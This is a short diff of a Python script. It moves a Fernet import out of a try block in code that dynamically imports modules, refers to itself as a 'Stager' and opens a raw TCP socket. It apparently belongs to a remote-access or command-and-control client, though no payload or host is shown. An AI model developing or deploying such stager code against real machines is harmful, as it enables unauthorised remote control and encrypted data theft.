@@ -20,12 +20,12 @@ except:
     try:
         for i in imports:
             globals()[i] = importlib.import_module(i)
-        # Manually
-        from cryptography.fernet import Fernet
     except:
         print("Couldnt execute the Stager.")
         print("Please install the required modules manually.")
         exit(1)
+# Manually
+from cryptography.fernet import Fernet
 fernet = ""
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
